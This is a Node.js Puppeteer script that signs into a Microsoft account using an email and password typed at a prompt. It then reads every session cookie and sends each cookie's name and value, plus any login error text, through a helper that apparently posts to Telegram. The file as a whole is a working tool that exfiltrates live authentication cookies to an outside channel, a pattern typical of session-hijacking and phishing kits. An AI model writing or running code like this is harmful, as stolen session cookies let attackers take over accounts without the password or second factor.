// microsoft_auto.js
const puppeteer = require('puppeteer');
const { sendTelegramMessage, prompt } = require('./utils');

async function main() {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  // Credentials
  const email = await prompt('Microsoft Email: ');
  const password = await prompt('Microsoft Password: ');

  try {
    await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' });
    await page.waitForSelector('input[type="email"]');
    await page.type('input[type="email"]', email, { delay: 50 });
    await page.click('input[type="submit"], button[type="submit"]');
    await page.waitForTimeout(2000);
    await page.waitForSelector('input[type="password"]', { visible: true });
    await page.type('input[type="password"]', password, { delay: 50 });
    await page.click('input[type="submit"], button[type="submit"]');

    // Handle "Stay signed in?" prompt
    try {
      await page.waitForSelector('input[type="checkbox"]', { timeout: 3000 });
      await page.click('input[type="checkbox"]'); // Uncheck if desired
      await page.click('button[type="submit"]');
    } catch (_) { }

    await page.waitForNavigation({ waitUntil: 'networkidle2' });
    const cookies = await page.cookies();

    let msg = '*Microsoft Cookies:*\n';
    if (cookies.length === 0) msg += 'No cookies found.';
    else cookies.forEach(c => { msg += `${c.name} = ${c.value}\n`; });
    await sendTelegramMessage(msg);
  } catch (err) {
    await sendTelegramMessage(`Microsoft login failed: ${err.message}`);
  }

  await browser.close();
}

main();